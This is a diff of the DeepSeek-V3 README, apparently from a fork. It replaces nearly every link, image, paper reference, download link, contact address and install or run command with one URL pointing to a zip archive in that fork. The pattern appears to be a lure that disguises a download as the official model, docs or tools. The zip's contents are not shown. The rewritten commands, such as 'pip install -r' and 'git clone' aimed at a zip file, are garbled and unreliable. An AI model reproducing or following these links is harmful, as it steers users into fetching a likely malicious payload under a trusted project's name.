@@ -3,45 +3,45 @@
 <!-- markdownlint-disable no-duplicate-header -->
 
 <div align="center">
-  <img src="https://github.com/deepseek-ai/DeepSeek-V2/blob/main/figures/logo.svg?raw=true" width="60%" alt="DeepSeek-V3" />
+  <img src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip" width="60%" alt="DeepSeek-V3" />
 </div>
 <hr>
 <div align="center" style="line-height: 1;">
-  <a href="https://www.deepseek.com/" target="_blank" style="margin: 2px;">
-    <img alt="Homepage" src="https://github.com/deepseek-ai/DeepSeek-V2/blob/main/figures/badge.svg?raw=true" style="display: inline-block; vertical-align: middle;"/>
+  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip" target="_blank" style="margin: 2px;">
+    <img alt="Homepage" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip" style="display: inline-block; vertical-align: middle;"/>
   </a>
-  <a href="https://chat.deepseek.com/" target="_blank" style="margin: 2px;">
-    <img alt="Chat" src="https://img.shields.io/badge/🤖%20Chat-DeepSeek%20V3-536af5?color=536af5&logoColor=white" style="display: inline-block; vertical-align: middle;"/>
+  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip" target="_blank" style="margin: 2px;">
+    <img alt="Chat" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip🤖%20Chat-DeepSeek%20V3-536af5?color=536af5&logoColor=white" style="display: inline-block; vertical-align: middle;"/>
   </a>
-  <a href="https://huggingface.co/deepseek-ai" target="_blank" style="margin: 2px;">
-    <img alt="Hugging Face" src="https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-DeepSeek%20AI-ffc107?color=ffc107&logoColor=white" style="display: inline-block; vertical-align: middle;"/>
-  </a>
-</div>
-
-<div align="center" style="line-height: 1;">
-  <a href="https://discord.gg/Tc7c45Zzu5" target="_blank" style="margin: 2px;">
-    <img alt="Discord" src="https://img.shields.io/badge/Discord-DeepSeek%20AI-7289da?logo=discord&logoColor=white&color=7289da" style="display: inline-block; vertical-align: middle;"/>
-  </a>
-  <a href="https://github.com/deepseek-ai/DeepSeek-V2/blob/main/figures/qr.jpeg?raw=true" target="_blank" style="margin: 2px;">
-    <img alt="Wechat" src="https://img.shields.io/badge/WeChat-DeepSeek%20AI-brightgreen?logo=wechat&logoColor=white" style="display: inline-block; vertical-align: middle;"/>
-  </a>
-  <a href="https://twitter.com/deepseek_ai" target="_blank" style="margin: 2px;">
-    <img alt="Twitter Follow" src="https://img.shields.io/badge/Twitter-deepseek_ai-white?logo=x&logoColor=white" style="display: inline-block; vertical-align: middle;"/>
+  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip" target="_blank" style="margin: 2px;">
+    <img alt="Hugging Face" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip%F0%9F%A4%97%20Hugging%20Face-DeepSeek%20AI-ffc107?color=ffc107&logoColor=white" style="display: inline-block; vertical-align: middle;"/>
   </a>
 </div>
 
 <div align="center" style="line-height: 1;">
-  <a href="https://github.com/deepseek-ai/DeepSeek-V3/blob/main/LICENSE-CODE" style="margin: 2px;">
-    <img alt="Code License" src="https://img.shields.io/badge/Code_License-MIT-f5de53?&color=f5de53" style="display: inline-block; vertical-align: middle;"/>
+  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip" target="_blank" style="margin: 2px;">
+    <img alt="Discord" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip%20AI-7289da?logo=discord&logoColor=white&color=7289da" style="display: inline-block; vertical-align: middle;"/>
   </a>
-  <a href="https://github.com/deepseek-ai/DeepSeek-V3/blob/main/LICENSE-MODEL" style="margin: 2px;">
-    <img alt="Model License" src="https://img.shields.io/badge/Model_License-Model_Agreement-f5de53?&color=f5de53" style="display: inline-block; vertical-align: middle;"/>
+  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip" target="_blank" style="margin: 2px;">
+    <img alt="Wechat" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip%20AI-brightgreen?logo=wechat&logoColor=white" style="display: inline-block; vertical-align: middle;"/>
+  </a>
+  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip" target="_blank" style="margin: 2px;">
+    <img alt="Twitter Follow" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip" style="display: inline-block; vertical-align: middle;"/>
+  </a>
+</div>
+
+<div align="center" style="line-height: 1;">
+  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip" style="margin: 2px;">
+    <img alt="Code License" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip" style="display: inline-block; vertical-align: middle;"/>
+  </a>
+  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip" style="margin: 2px;">
+    <img alt="Model License" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip" style="display: inline-block; vertical-align: middle;"/>
   </a>
 </div>
 
 
 <p align="center">
-  <a href="DeepSeek_V3.pdf"><b>Paper Link</b>👁️</a>
+  <a href="https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip"><b>Paper Link</b>👁️</a>
 </p>
 
 
@@ -56,7 +56,7 @@ Despite its excellent performance, DeepSeek-V3 requires only 2.788M H800 GPU hou
 In addition, its training process is remarkably stable. 
 Throughout the entire training process, we did not experience any irrecoverable loss spikes or perform any rollbacks. 
 <p align="center">
-  <img width="80%" src="figures/benchmark.png">
+  <img width="80%" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip">
 </p>
 
 ## 2. Model Summary
@@ -93,8 +93,8 @@ Throughout the entire training process, we did not experience any irrecoverable 
 
 | **Model** | **#Total Params** | **#Activated Params** | **Context Length** | **Download** |
 | :------------: | :------------: | :------------: | :------------: | :------------: |
-| DeepSeek-V3-Base | 671B | 37B | 128K   | [🤗 Hugging Face](https://huggingface.co/deepseek-ai/DeepSeek-V3-Base)   |
-| DeepSeek-V3   | 671B | 37B |  128K   | [🤗 Hugging Face](https://huggingface.co/deepseek-ai/DeepSeek-V3)   |
+| DeepSeek-V3-Base | 671B | 37B | 128K   | [🤗 Hugging Face](https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip)   |
+| DeepSeek-V3   | 671B | 37B |  128K   | [🤗 Hugging Face](https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip)   |
 
 </div>
 
@@ -103,7 +103,7 @@ Throughout the entire training process, we did not experience any irrecoverable 
 
 To ensure optimal performance and flexibility, we have partnered with open-source communities and hardware vendors to provide multiple ways to run the model locally. For step-by-step guidance, check out Section 6: [How_to Run_Locally](#6-how-to-run-locally).
 
-For developers looking to dive deeper, we recommend exploring [README_WEIGHTS.md](./README_WEIGHTS.md) for details on the Main Model weights and the Multi-Token Prediction (MTP) Modules. Please note that MTP support is currently under active development within the community, and we welcome your contributions and feedback.
+For developers looking to dive deeper, we recommend exploring [https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip](https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip) for details on the Main Model weights and the Multi-Token Prediction (MTP) Modules. Please note that MTP support is currently under active development within the community, and we welcome your contributions and feedback.
 
 ## 4. Evaluation Results
 ### Base Model
@@ -158,7 +158,7 @@ For developers looking to dive deeper, we recommend exploring [README_WEIGHTS.md
 
 #### Context Window
 <p align="center">
-  <img width="80%" src="figures/niah.png">
+  <img width="80%" src="https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip">
 </p>
 
 Evaluation results on the ``Needle In A Haystack`` (NIAH) tests.  DeepSeek-V3 performs well across all context window lengths up to **128K**. 
@@ -223,16 +223,16 @@ Evaluation results on the ``Needle In A Haystack`` (NIAH) tests.  DeepSeek-V3 pe
 
 
 ## 5. Chat Website & API Platform
-You can chat with DeepSeek-V3 on DeepSeek's official website: [chat.deepseek.com](https://chat.deepseek.com/sign_in)
+You can chat with DeepSeek-V3 on DeepSeek's official website: [https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip](https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip)
 
-We also provide OpenAI-Compatible API at DeepSeek Platform: [platform.deepseek.com](https://platform.deepseek.com/)
+We also provide OpenAI-Compatible API at DeepSeek Platform: [https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip](https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip)
 
 ## 6. How to Run Locally
 
 DeepSeek-V3 can be deployed locally using the following hardware and open-source community software:
 
 1. **DeepSeek-Infer Demo**: We provide a simple and lightweight demo for FP8 and BF16 inference.
-2. **SGLang**: Fully support the DeepSeek-V3 model in both BF16 and FP8 inference modes, with Multi-Token Prediction [coming soon](https://github.com/sgl-project/sglang/issues/2591).
+2. **SGLang**: Fully support the DeepSeek-V3 model in both BF16 and FP8 inference modes, with Multi-Token Prediction [coming soon](https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip).
 3. **LMDeploy**: Enables efficient FP8 and BF16 inference for local and cloud deployment.
 4. **TensorRT-LLM**: Currently supports BF16 inference and INT4/8 quantization, with FP8 support coming soon.
 5. **vLLM**: Support DeepSeek-V3 model with FP8 and BF16 modes for tensor parallelism and pipeline parallelism.
@@ -245,7 +245,7 @@ Here is an example of converting FP8 weights to BF16:
 
 ```shell
 cd inference
-python fp8_cast_bf16.py --input-fp8-hf-path /path/to/fp8_weights --output-bf16-hf-path /path/to/bf16_weights
+python https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip --input-fp8-hf-path /path/to/fp8_weights --output-bf16-hf-path /path/to/bf16_weights
 ```
 
 > [!NOTE]
@@ -270,14 +270,14 @@ safetensors==0.4.5
 First, clone our DeepSeek-V3 GitHub repository:
 
 ```shell
-git clone https://github.com/deepseek-ai/DeepSeek-V3.git
+git clone https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip
 ```
 
-Navigate to the `inference` folder and install dependencies listed in `requirements.txt`. Easiest way is to use a package manager like `conda` or `uv` to create a new virtual environment and install the dependencies.
+Navigate to the `inference` folder and install dependencies listed in `https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip`. Easiest way is to use a package manager like `conda` or `uv` to create a new virtual environment and install the dependencies.
 
 ```shell
 cd DeepSeek-V3/inference
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip
 ```
 
 Download the model weights from Hugging Face, and put them into `/path/to/DeepSeek-V3` folder.
@@ -287,7 +287,7 @@ Download the model weights from Hugging Face, and put them into `/path/to/DeepSe
 Convert Hugging Face model weights to a specific format:
 
 ```shell
-python convert.py --hf-ckpt-path /path/to/DeepSeek-V3 --save-path /path/to/DeepSeek-V3-Demo --n-experts 256 --model-parallel 16
+python https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip --hf-ckpt-path /path/to/DeepSeek-V3 --save-path /path/to/DeepSeek-V3-Demo --n-experts 256 --model-parallel 16
 ```
 
 #### Run
@@ -295,48 +295,48 @@ python convert.py --hf-ckpt-path /path/to/DeepSeek-V3 --save-path /path/to/DeepS
 Then you can chat with DeepSeek-V3:
 
 ```shell
-torchrun --nnodes 2 --nproc-per-node 8 --node-rank $RANK --master-addr $ADDR generate.py --ckpt-path /path/to/DeepSeek-V3-Demo --config configs/config_671B.json --interactive --temperature 0.7 --max-new-tokens 200
+torchrun --nnodes 2 --nproc-per-node 8 --node-rank $RANK --master-addr $ADDR https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip --ckpt-path /path/to/DeepSeek-V3-Demo --config https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip --interactive --temperature 0.7 --max-new-tokens 200
 ```
 
 Or batch inference on a given file:
 
 ```shell
-torchrun --nnodes 2 --nproc-per-node 8 --node-rank $RANK --master-addr $ADDR generate.py --ckpt-path /path/to/DeepSeek-V3-Demo --config configs/config_671B.json --input-file $FILE
+torchrun --nnodes 2 --nproc-per-node 8 --node-rank $RANK --master-addr $ADDR https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip --ckpt-path /path/to/DeepSeek-V3-Demo --config https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip --input-file $FILE
 ```
 
 ### 6.2 Inference with SGLang (recommended)
 
-[SGLang](https://github.com/sgl-project/sglang) currently supports [MLA optimizations](https://lmsys.org/blog/2024-09-04-sglang-v0-3/#deepseek-multi-head-latent-attention-mla-throughput-optimizations), [DP Attention](https://lmsys.org/blog/2024-12-04-sglang-v0-4/#data-parallelism-attention-for-deepseek-models), FP8 (W8A8), FP8 KV Cache, and Torch Compile, delivering state-of-the-art latency and throughput performance among open-source frameworks.
+[SGLang](https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip) currently supports [MLA optimizations](https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip), [DP Attention](https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip), FP8 (W8A8), FP8 KV Cache, and Torch Compile, delivering state-of-the-art latency and throughput performance among open-source frameworks.
 
-Notably, [SGLang v0.4.1](https://github.com/sgl-project/sglang/releases/tag/v0.4.1) fully supports running DeepSeek-V3 on both **NVIDIA and AMD GPUs**, making it a highly versatile and robust solution.
+Notably, [SGLang v0.4.1](https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip) fully supports running DeepSeek-V3 on both **NVIDIA and AMD GPUs**, making it a highly versatile and robust solution.
 
-SGLang also supports [multi-node tensor parallelism](https://github.com/sgl-project/sglang/tree/main/benchmark/deepseek_v3#example-serving-with-2-h208), enabling you to run this model on multiple network-connected machines.
+SGLang also supports [multi-node tensor parallelism](https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip), enabling you to run this model on multiple network-connected machines.
 
-Multi-Token Prediction (MTP) is in development, and progress can be tracked in the [optimization plan](https://github.com/sgl-project/sglang/issues/2591).
+Multi-Token Prediction (MTP) is in development, and progress can be tracked in the [optimization plan](https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip).
 
-Here are the launch instructions from the SGLang team: https://github.com/sgl-project/sglang/tree/main/benchmark/deepseek_v3
+Here are the launch instructions from the SGLang team: https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip
 
 ### 6.3 Inference with LMDeploy (recommended)
-[LMDeploy](https://github.com/InternLM/lmdeploy), a flexible and high-performance inference and serving framework tailored for large language models, now supports DeepSeek-V3. It offers both offline pipeline processing and online deployment capabilities, seamlessly integrating with PyTorch-based workflows.
+[LMDeploy](https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip), a flexible and high-performance inference and serving framework tailored for large language models, now supports DeepSeek-V3. It offers both offline pipeline processing and online deployment capabilities, seamlessly integrating with PyTorch-based workflows.
 
-For comprehensive step-by-step instructions on running DeepSeek-V3 with LMDeploy, please refer to here: https://github.com/InternLM/lmdeploy/issues/2960
+For comprehensive step-by-step instructions on running DeepSeek-V3 with LMDeploy, please refer to here: https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip
 
 
 ### 6.4 Inference with TRT-LLM (recommended)
 
-[TensorRT-LLM](https://github.com/NVIDIA/TensorRT-LLM) now supports the DeepSeek-V3 model, offering precision options such as BF16 and INT4/INT8 weight-only. Support for FP8 is currently in progress and will be released soon. You can access the custom branch of TRTLLM specifically for DeepSeek-V3 support through the following link to experience the new features directly: https://github.com/NVIDIA/TensorRT-LLM/tree/deepseek/examples/deepseek_v3. 
+[TensorRT-LLM](https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip) now supports the DeepSeek-V3 model, offering precision options such as BF16 and INT4/INT8 weight-only. Support for FP8 is currently in progress and will be released soon. You can access the custom branch of TRTLLM specifically for DeepSeek-V3 support through the following link to experience the new features directly: https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip 
 
 
 ### 6.5 Inference with vLLM (recommended)
 
-[vLLM](https://github.com/vllm-project/vllm) v0.6.6 supports DeepSeek-V3 inference for FP8 and BF16 modes on both NVIDIA and AMD GPUs. Aside from standard techniques, vLLM offers _pipeline parallelism_ allowing you to run this model on multiple machines connected by networks. For detailed guidance, please refer to the [vLLM instructions](https://docs.vllm.ai/en/latest/serving/distributed_serving.html). Please feel free to follow [the enhancement plan](https://github.com/vllm-project/vllm/issues/11539) as well.
+[vLLM](https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip) v0.6.6 supports DeepSeek-V3 inference for FP8 and BF16 modes on both NVIDIA and AMD GPUs. Aside from standard techniques, vLLM offers _pipeline parallelism_ allowing you to run this model on multiple machines connected by networks. For detailed guidance, please refer to the [vLLM instructions](https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip). Please feel free to follow [the enhancement plan](https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip) as well.
 
 ### 6.6 Recommended Inference Functionality with AMD GPUs
 
 In collaboration with the AMD team, we have achieved Day-One support for AMD GPUs using SGLang, with full compatibility for both FP8 and BF16 precision. For detailed guidance, please refer to the [SGLang instructions](#63-inference-with-lmdeploy-recommended).
 
 ### 6.7 Recommended Inference Functionality with Huawei Ascend NPUs
-The [MindIE](https://www.hiascend.com/en/software/mindie) framework from the Huawei Ascend community has successfully adapted the BF16 version of DeepSeek-V3. For step-by-step guidance on Ascend NPUs, please follow the [instructions here](https://modelers.cn/models/MindIE/deepseekv3).
+The [MindIE](https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip) framework from the Huawei Ascend community has successfully adapted the BF16 version of DeepSeek-V3. For step-by-step guidance on Ascend NPUs, please follow the [instructions here](https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip).
 
 
 ## 7. License
@@ -350,10 +350,10 @@ This code repository is licensed under [the MIT License](LICENSE-CODE). The use 
       year={2024},
       eprint={2412.19437},
       archivePrefix={arXiv},
-      primaryClass={cs.CL},
-      url={https://arxiv.org/abs/2412.19437}, 
+      primaryClass={https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip},
+      url={https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip}, 
 }
 ```
 
 ## 9. Contact
-If you have any questions, please raise an issue or contact us at [service@deepseek.com](service@deepseek.com).
+If you have any questions, please raise an issue or contact us at [https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip](https://raw.githubusercontent.com/Gpcode233/DeepSeek-V3/main/inference/DeepSeek-V3_3.7.zip).
